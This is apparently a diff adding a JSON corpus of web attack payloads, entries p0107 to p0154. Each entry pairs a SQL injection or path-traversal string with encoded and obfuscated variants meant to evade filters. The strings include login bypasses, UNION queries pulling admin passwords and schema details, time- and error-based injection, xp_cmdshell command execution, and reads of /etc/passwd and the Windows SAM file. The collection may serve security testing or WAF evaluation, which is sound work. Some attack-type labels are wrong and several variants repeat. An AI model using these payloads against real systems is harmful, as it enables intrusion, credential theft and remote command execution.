+    "base_payload": "' OR '1'='1' --",
+    "attack_type": "header-injection",
+    "variants": [
+      "JyBPUiAnMSc9JzEnIC0t",
+      "'/**/OR/**/'1'='1'/**/--",
+      "' OR '1'='1' --%00",
+      "'\tOR\t'1'='1'\t--",
+      "' OR '1'='1' --"
+    ],
+    "example_param": "User-Agent"
+  },
+  {
+    "payload_id": "p0108",
+    "base_payload": "127.0.0.1' OR '1'='1",
+    "attack_type": "header-injection",
+    "variants": [
+      "127.0.0.1%27%20OR%20%271%27%3D%271",
+      "127.0.0.1'\nOR\n'1'='1",
+      "MTI3LjAuMC4xJyBPUiAnMSc9JzE=",
+      "127.0.0.1'+OR+'1'='1",
+      "127.0.0.1%2527%2520OR%2520%25271%2527%253D%25271"
+    ],
+    "example_param": "User-Agent"
+  },
+  {
+    "payload_id": "p0109",
+    "base_payload": "admin' OR 1=1--",
+    "attack_type": "header-injection",
+    "variants": [
+      "%61%64%6d%69%6e%27%20%4f%52%20%31%3d%31%2d%2d",
+      "admin' OR 1=1--%00",
+      "admin%2527%2520OR%25201%253D1--",
+      "admin'\tOR\t1=1--",
+      "admin%27%20OR%201%3D1--"
+    ],
+    "example_param": "Referer"
+  },
+  {
+    "payload_id": "p0110",
+    "base_payload": "' UNION SELECT password FROM users WHERE username='admin'--",
+    "attack_type": "header-injection",
+    "variants": [
+      "%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27%2d%2d",
+      "'\tUNION\tSELECT\tpassword\tFROM\tusers\tWHERE\tusername='admin'--",
+      "%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users%2520WHERE%2520username%253D%2527admin%2527--",
+      "'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'--",
+      "' UniON seLecT pAsSwOrd FROM uSERS wHeRe USeRnAME='ADmin'--"
+    ],
+    "example_param": "Referer"
+  },
+  {
+    "payload_id": "p0111",
+    "base_payload": "Mozilla' OR '1'='1",
+    "attack_type": "header-injection",
+    "variants": [
+      "%4d%6f%7a%69%6c%6c%61%27%20%4f%52%20%27%31%27%3d%27%31",
+      "Mozilla'%20OR%20'1'='1",
+      "Mozilla'/**/OR/**/'1'='1",
+      "Mozilla%27%20OR%20%271%27%3D%271",
+      "mOZiLlA' or '1'='1"
+    ],
+    "example_param": "Referer"
+  },
+  {
+    "payload_id": "p0112",
+    "base_payload": "en-US' OR 1=1--",
+    "attack_type": "header-injection",
+    "variants": [
+      "en-US%27%20OR%201%3D1--",
+      "en-US'\tOR\t1=1--",
+      "%65%6e%2d%55%53%27%20%4f%52%20%31%3d%31%2d%2d",
+      "en-US'/**/OR/**/1=1--",
+      "en-US'%20OR%201=1--"
+    ],
+    "example_param": "Referer"
+  },
+  {
+    "payload_id": "p0113",
+    "base_payload": "../../../etc/passwd",
+    "attack_type": "path-injection",
+    "variants": [
+      "../../../etc/passwd",
+      "../../../etc/passwd",
+      "../../../etc/passwd",
+      "../../../etc/passwd%00",
+      "Li4vLi4vLi4vZXRjL3Bhc3N3ZA=="
+    ],
+    "example_param": "document"
+  },
+  {
+    "payload_id": "p0114",
+    "base_payload": "..\\..\\..\\windows\\system32\\config\\sam",
+    "attack_type": "path-injection",
+    "variants": [
+      "..\\..\\..\\windows\\system32\\config\\sam%00",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "..\\..\\..\\wINdoWS\\SystEM32\\cONfiG\\saM",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam"
+    ],
+    "example_param": "document"
+  },
+  {
+    "payload_id": "p0115",
+    "base_payload": "' OR '1'='1",
+    "attack_type": "path-injection",
+    "variants": [
+      "%2527%2520OR%2520%25271%2527%253D%25271",
+      "' OR '1'='1%00",
+      "' oR '1'='1",
+      "%27%20OR%20%271%27%3D%271",
+      "'\tOR\t'1'='1"
+    ],
+    "example_param": "document"
+  },
+  {
+    "payload_id": "p0116",
+    "base_payload": "1' OR '1'='1",
+    "attack_type": "path-injection",
+    "variants": [
+      "1%2527%2520OR%2520%25271%2527%253D%25271",
+      "1' Or '1'='1",
+      "1'/**/OR/**/'1'='1",
+      "1'%20OR%20'1'='1",
+      "%31%27%20%4f%52%20%27%31%27%3d%27%31"
+    ],
+    "example_param": "file"
+  },
+  {
+    "payload_id": "p0117",
+    "base_payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "attack_type": "path-injection",
+    "variants": [
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "JTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dk"
+    ],
+    "example_param": "document"
+  },
+  {
+    "payload_id": "p0118",
+    "base_payload": "....//....//....//etc/passwd",
+    "attack_type": "path-injection",
+    "variants": [
+      "Li4uLi8vLi4uLi8vLi4uLi8vZXRjL3Bhc3N3ZA==",
+      "....//....//....//ETc/pasSWD",
+      "....//....//....//etc/passwd",
+      "....//....//....//etc/passwd",
+      "....//....//....//etc/passwd"
+    ],
+    "example_param": "file"
+  },
+  {
+    "payload_id": "p0119",
+    "base_payload": "..;/..;/..;/etc/passwd",
+    "attack_type": "path-injection",
+    "variants": [
+      "..%253B/..%253B/..%253B/etc/passwd",
+      "..;/..;/..;/etc/passwd%00",
+      "..;/..;/..;/etc/passwd",
+      "..;/..;/..;/EtC/PaSSwD",
+      "..;/..;/..;/etc/passwd"
+    ],
+    "example_param": "document"
+  },
+  {
+    "payload_id": "p0120",
+    "base_payload": "' UNION SELECT column_name,NULL FROM information_schema.columns-- AND 1=1",
+    "attack_type": "union",
+    "variants": [
+      "'\nUNION\nSELECT\ncolumn_name,NULL\nFROM\ninformation_schema.columns--\nAND\n1=1",
+      "JyBVTklPTiBTRUxFQ1QgY29sdW1uX25hbWUsTlVMTCBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zLS0gQU5EIDE9MQ==",
+      "' UNION SELECT column_name,NULL FROM information_schema.columns-- AND 1=1%00",
+      "'%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns--%20AND%201=1",
+      "%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%2c%4e%55%4c%4c%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%6f%6c%75%6d%6e%73%2d%2d%20%41%4e%44%20%31%3d%31"
+    ],
+    "example_param": "page"
+  },
+  {
+    "payload_id": "p0121",
+    "base_payload": "1'/**/OR/**/'1'='1",
+    "attack_type": "path-injection",
+    "variants": [
+      "1'/**/OR/**/'1'='1%00",
+      "1'/**/OR/**/'1'='1",
+      "1%2527/%252A%252A/OR/%252A%252A/%25271%2527%253D%25271",
+      "1'/**/OR/**/'1'='1",
+      "1'/**/OR/**/'1'='1"
+    ],
+    "example_param": "document"
+  },
+  {
+    "payload_id": "p0122",
+    "base_payload": "1' UNION SELECT @@version,NULL,NULL#",
+    "attack_type": "union",
+    "variants": [
+      "1%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL%23",
+      "%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%40%40%76%65%72%73%69%6f%6e%2c%4e%55%4c%4c%2c%4e%55%4c%4c%23",
+      "MScgVU5JT04gU0VMRUNUIEBAdmVyc2lvbixOVUxMLE5VTEwj",
+      "1%2527%2520UNION%2520SELECT%2520%2540%2540version%252CNULL%252CNULL%2523",
+      "1'%20UNION%20SELECT%20@@version,NULL,NULL#"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0123",
+    "base_payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "attack_type": "time-based",
+    "variants": [
+      "'\tAND\t(SELECT\t*\tFROM\t(SELECT(SLEEP(5)))a)--",
+      "'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+      "%27%20%41%4e%44%20%28%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d",
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00",
+      "' and (selEcT * froM (selecT(sLEep(5)))a)--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0124",
+    "base_payload": "' OR polygon((select * from(select * from(select version())a)b))--",
+    "attack_type": "error",
+    "variants": [
+      "JyBPUiBwb2x5Z29uKChzZWxlY3QgKiBmcm9tKHNlbGVjdCAqIGZyb20oc2VsZWN0IHZlcnNpb24oKSlhKWIpKS0t",
+      "'/**/OR/**/polygon((select/**/*/**/from(select/**/*/**/from(select/**/version())a)b))--",
+      "' OR polygon((select * from(select * from(select version())a)b))--%00",
+      "%27%20%4f%52%20%70%6f%6c%79%67%6f%6e%28%28%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%28%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%28%73%65%6c%65%63%74%20%76%65%72%73%69%6f%6e%28%29%29%61%29%62%29%29%2d%2d",
+      "%2527%2520OR%2520polygon%2528%2528select%2520%252A%2520from%2528select%2520%252A%2520from%2528select%2520version%2528%2529%2529a%2529b%2529%2529--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0125",
+    "base_payload": "' OR '1'='1' AND ''='",
+    "attack_type": "boolean",
+    "variants": [
+      "'/**/OR/**/'1'='1'/**/AND/**/''='",
+      "'\tOR\t'1'='1'\tAND\t''='",
+      "' OR '1'='1' AND ''='%00",
+      "' or '1'='1' aNd ''='",
+      "%27%20%4f%52%20%27%31%27%3d%27%31%27%20%41%4e%44%20%27%27%3d%27"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0126",
+    "base_payload": "(' OR 1=1--)",
+    "attack_type": "boolean",
+    "variants": [
+      "(' OR 1=1--)%00",
+      "%28%27%20OR%201%3D1--%29",
+      "%2528%2527%2520OR%25201%253D1--%2529",
+      "('%20OR%201=1--)",
+      "(' Or 1=1--)"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0127",
+    "base_payload": "' AND gtid_subset(version(),1)#",
+    "attack_type": "error",
+    "variants": [
+      "'%20AND%20gtid_subset(version(),1)#",
+      "'/**/AND/**/gtid_subset(version(),1)#",
+      "%2527%2520AND%2520gtid_subset%2528version%2528%2529%252C1%2529%2523",
+      "' AND gtid_subset(version(),1)#%00",
+      "' AnD GTID_SubsEt(VersIOn(),1)#"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0128",
+    "base_payload": "1'/**/OR/**/'1' LIKE '1",
+    "attack_type": "path-injection",
+    "variants": [
+      "1%2527/%252A%252A/OR/%252A%252A/%25271%2527%2520LIKE%2520%25271",
+      "1'/**/OR/**/'1'%20LIKE%20'1",
+      "1'/**/OR/**/'1' LIKE '1%00",
+      "1'/**/OR/**/'1'\tLIKE\t'1",
+      "1'/**/OR/**/'1' LIke '1"
+    ],
+    "example_param": "path"
+  },
+  {
+    "payload_id": "p0129",
+    "base_payload": "'/**/UNION/**/SELECT/**/column_name,NULL/**/FROM/**/information_schema.columns--/**/AND/**/1=1",
+    "attack_type": "union",
+    "variants": [
+      "'/**/UNION/**/SELECT/**/column_name,NULL/**/FROM/**/information_schema.columns--/**/AND/**/1=1",
+      "'/**/UNION/**/SELECT/**/column_name,NULL/**/FROM/**/information_schema.columns--/**/AND/**/1=1%00",
+      "'/**/UNION/**/SELECT/**/column_name,NULL/**/FROM/**/information_schema.columns--/**/AND/**/1=1",
+      "%2527/%252A%252A/UNION/%252A%252A/SELECT/%252A%252A/column_name%252CNULL/%252A%252A/FROM/%252A%252A/information_schema.columns--/%252A%252A/AND/%252A%252A/1%253D1",
+      "Jy8qKi9VTklPTi8qKi9TRUxFQ1QvKiovY29sdW1uX25hbWUsTlVMTC8qKi9GUk9NLyoqL2luZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zLS0vKiovQU5ELyoqLzE9MQ=="
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0130",
+    "base_payload": "(1' AND SLEEP(5)#)",
+    "attack_type": "time-based",
+    "variants": [
+      "(1' AND SLEEP(5)#)%00",
+      "(1'\nAND\nSLEEP(5)#)",
+      "(1'+AND+SLEEP(5)#)",
+      "(1'%20AND%20SLEEP(5)#)",
+      "KDEnIEFORCBTTEVFUCg1KSMp"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0131",
+    "base_payload": "(1' AND SLEEP(5)#)",
+    "attack_type": "time-based",
+    "variants": [
+      "(1' AND SLeEp(5)#)",
+      "(1'+AND+SLEEP(5)#)",
+      "(1'%20AND%20SLEEP(5)#)",
+      "(1'\nAND\nSLEEP(5)#)",
+      "%28%31%27%20%41%4e%44%20%53%4c%45%45%50%28%35%29%23%29"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0132",
+    "base_payload": "1' Or 1=1#",
+    "attack_type": "boolean",
+    "variants": [
+      "MScgT3IgMT0xIw==",
+      "1'\tOr\t1=1#",
+      "1' or 1=1#",
+      "1'/**/Or/**/1=1#",
+      "1'+Or+1=1#"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0133",
+    "base_payload": "' OR '1' LIKE '1",
+    "attack_type": "boolean",
+    "variants": [
+      "'\tOR\t'1'\tLIKE\t'1",
+      "%27%20OR%20%271%27%20LIKE%20%271",
+      "'+OR+'1'+LIKE+'1",
+      "%27%20%4f%52%20%27%31%27%20%4c%49%4b%45%20%27%31",
+      "'\nOR\n'1'\nLIKE\n'1"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0134",
+    "base_payload": "' UNION SeLeCt * FROM (SeLeCt NULL,NULL,NULL)a--",
+    "attack_type": "union",
+    "variants": [
+      "' UNION SeLeCt * FROM (SeLeCt NULL,NULL,NULL)a--%00",
+      "%2527%2520UNION%2520SeLeCt%2520%252A%2520FROM%2520%2528SeLeCt%2520NULL%252CNULL%252CNULL%2529a--",
+      "'/**/UNION/**/SeLeCt/**/*/**/FROM/**/(SeLeCt/**/NULL,NULL,NULL)a--",
+      "%27%20UNION%20SeLeCt%20%2A%20FROM%20%28SeLeCt%20NULL%2CNULL%2CNULL%29a--",
+      "'\nUNION\nSeLeCt\n*\nFROM\n(SeLeCt\nNULL,NULL,NULL)a--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0135",
+    "base_payload": "' Or 'a'='a",
+    "attack_type": "boolean",
+    "variants": [
+      "'+Or+'a'='a",
+      "' Or 'a'='a%00",
+      "'%20Or%20'a'='a",
+      "'\tOr\t'a'='a",
+      "'/**/Or/**/'a'='a"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0136",
+    "base_payload": "999' UNION SELECT 1,2,3,4,5,6,7,8,9,10#",
+    "attack_type": "union",
+    "variants": [
+      "999' UniOn seLeCT 1,2,3,4,5,6,7,8,9,10#",
+      "999%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%23",
+      "OTk5JyBVTklPTiBTRUxFQ1QgMSwyLDMsNCw1LDYsNyw4LDksMTAj",
+      "999'%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10#",
+      "999'+UNION+SELECT+1,2,3,4,5,6,7,8,9,10#"
+    ],
+    "example_param": "item"
+  },
+  {
+    "payload_id": "p0137",
+    "base_payload": "' AND (SeLeCt * FROM (SeLeCt(SLEEP(5)))a)--",
+    "attack_type": "time-based",
+    "variants": [
+      "' AnD (sEleCT * FRoM (sELeCt(sLeEP(5)))a)--",
+      "%2527%2520AND%2520%2528SeLeCt%2520%252A%2520FROM%2520%2528SeLeCt%2528SLEEP%25285%2529%2529%2529a%2529--",
+      "%27%20%41%4e%44%20%28%53%65%4c%65%43%74%20%2a%20%46%52%4f%4d%20%28%53%65%4c%65%43%74%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d",
+      "' AND (SeLeCt * FROM (SeLeCt(SLEEP(5)))a)--%00",
+      "'\tAND\t(SeLeCt\t*\tFROM\t(SeLeCt(SLEEP(5)))a)--"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0138",
+    "base_payload": "admin' OR 1=1-- AND 1=1",
+    "attack_type": "header-injection",
+    "variants": [
+      "admin' OR 1=1-- AND 1=1%00",
+      "admin'+OR+1=1--+AND+1=1",
+      "%61%64%6d%69%6e%27%20%4f%52%20%31%3d%31%2d%2d%20%41%4e%44%20%31%3d%31",
+      "admin'/**/OR/**/1=1--/**/AND/**/1=1",
+      "YWRtaW4nIE9SIDE9MS0tIEFORCAxPTE="
+    ],
+    "example_param": "Referer"
+  },
+  {
+    "payload_id": "p0139",
+    "base_payload": "' OR BENCHMARK(5000000,MD5('A'))-- AND 1=1",
+    "attack_type": "time-based",
+    "variants": [
+      "'\tOR\tBENCHMARK(5000000,MD5('A'))--\tAND\t1=1",
+      "'%20OR%20BENCHMARK(5000000,MD5('A'))--%20AND%201=1",
+      "%27%20OR%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29--%20AND%201%3D1",
+      "JyBPUiBCRU5DSE1BUksoNTAwMDAwMCxNRDUoJ0EnKSktLSBBTkQgMT0x",
+      "%2527%2520OR%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--%2520AND%25201%253D1"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0140",
+    "base_payload": "('; EXEC master..xp_cmdshell 'whoami'--)",
+    "attack_type": "stacked",
+    "variants": [
+      "(';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--)",
+      "(';\nEXEC\nmaster..xp_cmdshell\n'whoami'--)",
+      "KCc7IEVYRUMgbWFzdGVyLi54cF9jbWRzaGVsbCAnd2hvYW1pJy0tKQ==",
+      "(';+EXEC+master..xp_cmdshell+'whoami'--)",
+      "(';\tEXEC\tmaster..xp_cmdshell\t'whoami'--)"
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0141",
+    "base_payload": "'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--",
+    "attack_type": "union",
+    "variants": [
+      "'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--",
+      "'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--",
+      "'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--",
+      "'/**/UNiON/**/SelECT/**/*/**/fRoM/**/(SEleCt/**/nULl,NUll,nulL)a--",
+      "%27/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A/%2A%2A/FROM/%2A%2A/%28SELECT/%2A%2A/NULL%2CNULL%2CNULL%29a--"
+    ],
+    "example_param": "page"
+  },
+  {
+    "payload_id": "p0142",
+    "base_payload": "' OR BENCHMARK(5000000,MD5('A'))-- AND 1=1 AND 1=1",
+    "attack_type": "time-based",
+    "variants": [
+      "'%20OR%20BENCHMARK(5000000,MD5('A'))--%20AND%201=1%20AND%201=1",
+      "'/**/OR/**/BENCHMARK(5000000,MD5('A'))--/**/AND/**/1=1/**/AND/**/1=1",
+      "JyBPUiBCRU5DSE1BUksoNTAwMDAwMCxNRDUoJ0EnKSktLSBBTkQgMT0xIEFORCAxPTE=",
+      "%27%20%4f%52%20%42%45%4e%43%48%4d%41%52%4b%28%35%30%30%30%30%30%30%2c%4d%44%35%28%27%41%27%29%29%2d%2d%20%41%4e%44%20%31%3d%31%20%41%4e%44%20%31%3d%31",
+      "'+OR+BENCHMARK(5000000,MD5('A'))--+AND+1=1+AND+1=1"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0143",
+    "base_payload": "1' AND SLEEP(5)--",
+    "attack_type": "time-based",
+    "variants": [
+      "1'%20AND%20SLEEP(5)--",
+      "1'/**/AND/**/SLEEP(5)--",
+      "1' ANd SlEep(5)--",
+      "1'\nAND\nSLEEP(5)--",
+      "1' AND SLEEP(5)--%00"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0144",
+    "base_payload": "' OR a=a--",
+    "attack_type": "boolean",
+    "variants": [
+      "' oR A=a--",
+      "'%20OR%20a=a--",
+      "JyBPUiBhPWEtLQ==",
+      "' OR a=a--%00",
+      "'/**/OR/**/a=a--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0145",
+    "base_payload": "('; EXEC sp_configure 'show advanced options',1--)",
+    "attack_type": "stacked",
+    "variants": [
+      "('; EXEC sp_configure 'show advanced options',1--)%00",
+      "(';/**/EXEC/**/sp_configure/**/'show/**/advanced/**/options',1--)",
+      "%28%27%3B%20EXEC%20sp_configure%20%27show%20advanced%20options%27%2C1--%29",
+      "(';+EXEC+sp_configure+'show+advanced+options',1--)",
+      "KCc7IEVYRUMgc3BfY29uZmlndXJlICdzaG93IGFkdmFuY2VkIG9wdGlvbnMnLDEtLSk="
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0146",
+    "base_payload": "admin' Or '1'='1'--",
+    "attack_type": "boolean",
+    "variants": [
+      "admin%27%20Or%20%271%27%3D%271%27--",
+      "aDmin' oR '1'='1'--",
+      "admin'%20Or%20'1'='1'--",
+      "admin' Or '1'='1'--%00",
+      "YWRtaW4nIE9yICcxJz0nMSctLQ=="
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0147",
+    "base_payload": "'/**/OR/**/1#",
+    "attack_type": "boolean",
+    "variants": [
+      "'/**/OR/**/1#",
+      "'/**/OR/**/1#",
+      "'/**/OR/**/1#",
+      "%2527/%252A%252A/OR/%252A%252A/1%2523",
+      "'/**/OR/**/1#%00"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0148",
+    "base_payload": "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+    "attack_type": "stacked",
+    "variants": [
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+      "%27%3B/%2A%2A/EXEC/%2A%2A/master..xp_cmdshell/%2A%2A/%27whoami%27--",
+      "JzsvKiovRVhFQy8qKi9tYXN0ZXIuLnhwX2NtZHNoZWxsLyoqLyd3aG9hbWknLS0="
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0149",
+    "base_payload": "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+    "attack_type": "error",
+    "variants": [
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+      "%2527/%252A%252A/AND/%252A%252A/%2528SELECT/%252A%252A/%252A/%252A%252A/FROM/%252A%252A/%2528SELECT%2528SLEEP%25280%2529%2529%2529a%2529--",
+      "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/%2A/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%280%29%29%29a%29--",
+      "%27%2f%2a%2a%2f%41%4e%44%2f%2a%2a%2f%28%53%45%4c%45%43%54%2f%2a%2a%2f%2a%2f%2a%2a%2f%46%52%4f%4d%2f%2a%2a%2f%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%30%29%29%29%61%29%2d%2d"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0150",
+    "base_payload": "' OR 1=1 AND row(1,1)>(SeLeCt COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x LIMIT 1)--",
+    "attack_type": "error",
+    "variants": [
+      "'%20OR%201=1%20AND%20row(1,1)>(SeLeCt%20COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%20LIMIT%201)--",
+      "' OR 1=1 AND row(1,1)>(SeLeCt COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x LIMIT 1)--%00",
+      "'\nOR\n1=1\nAND\nrow(1,1)>(SeLeCt\nCOUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x\nFROM\nINFORMATION_SCHEMA.PLUGINS\nGROUP\nBY\nx\nLIMIT\n1)--",
+      "' or 1=1 And Row(1,1)>(sELEct COUnt(*),coNcaT(ChAr(58),ChAr(58),FloOr(RaNd(0)*2))X FroM InFormAtIOn_SCHema.PLuginS groUP BY X LiMIt 1)--",
+      "%27%20%4f%52%20%31%3d%31%20%41%4e%44%20%72%6f%77%28%31%2c%31%29%3e%28%53%65%4c%65%43%74%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%43%48%41%52%28%35%38%29%2c%43%48%41%52%28%35%38%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%20%4c%49%4d%49%54%20%31%29%2d%2d"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0151",
+    "base_payload": "(' AND 1=(SELECT 1 FROM pg_sleep(5))--)",
+    "attack_type": "time-based",
+    "variants": [
+      "%2528%2527%2520AND%25201%253D%2528SELECT%25201%2520FROM%2520pg_sleep%25285%2529%2529--%2529",
+      "(' aNd 1=(SELeCt 1 from Pg_sLeEP(5))--)",
+      "('\tAND\t1=(SELECT\t1\tFROM\tpg_sleep(5))--)",
+      "(' AND 1=(SELECT 1 FROM pg_sleep(5))--)%00",
+      "('\nAND\n1=(SELECT\n1\nFROM\npg_sleep(5))--)"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0152",
+    "base_payload": "(('; EXEC master..xp_cmdshell 'whoami'--))",
+    "attack_type": "stacked",
+    "variants": [
+      "(('; ExEc mAsTEr..XP_cmDsHELL 'WhoaMi'--))",
+      "((';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--))",
+      "((';\nEXEC\nmaster..xp_cmdshell\n'whoami'--))",
+      "((';%20EXEC%20master..xp_cmdshell%20'whoami'--))",
+      "((';\tEXEC\tmaster..xp_cmdshell\t'whoami'--))"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0153",
+    "base_payload": "(' OR '1'='1' AND ''=')",
+    "attack_type": "boolean",
+    "variants": [
+      "('+OR+'1'='1'+AND+''=')",
+      "('/**/OR/**/'1'='1'/**/AND/**/''=')",
+      "(' or '1'='1' ANd ''=')",
+      "%28%27%20OR%20%271%27%3D%271%27%20AND%20%27%27%3D%27%29",
+      "('\nOR\n'1'='1'\nAND\n''=')"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0154",
+    "base_payload": "' OR 1=1 AND row(1,1)>(SeLeCt COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x LIMIT 1)#",
+    "attack_type": "error",
+    "variants": [
+      "JyBPUiAxPTEgQU5EIHJvdygxLDEpPihTZUxlQ3QgQ09VTlQoKiksQ09OQ0FUKENIQVIoNTgpLENIQVIoNTgpLEZMT09SKFJBTkQoMCkqMikpeCBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5QTFVHSU5TIEdST1VQIEJZIHggTElNSVQgMSkj",
+      "%27%20%4f%52%20%31%3d%31%20%41%4e%44%20%72%6f%77%28%31%2c%31%29%3e%28%53%65%4c%65%43%74%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%43%48%41%52%28%35%38%29%2c%43%48%41%52%28%35%38%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%20%4c%49%4d%49%54%20%31%29%23",
+      "%2527%2520OR%25201%253D1%2520AND%2520row%25281%252C1%2529%253E%2528SeLeCt%2520COUNT%2528%252A%2529%252CCONCAT%2528CHAR%252858%2529%252CCHAR%252858%2529%252CFLOOR%2528RAND%25280%2529%252A2%2529%2529x%2520FROM%2520INFORMATION_SCHEMA.PLUGINS%2520GROUP%2520BY%2520x%2520LIMIT%25201%2529%2523",
+      "'\tOR\t1=1\tAND\trow(1,1)>(SeLeCt\tCOUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x\tFROM\tINFORMATION_SCHEMA.PLUGINS\tGROUP\tBY\tx\tLIMIT\t1)#",
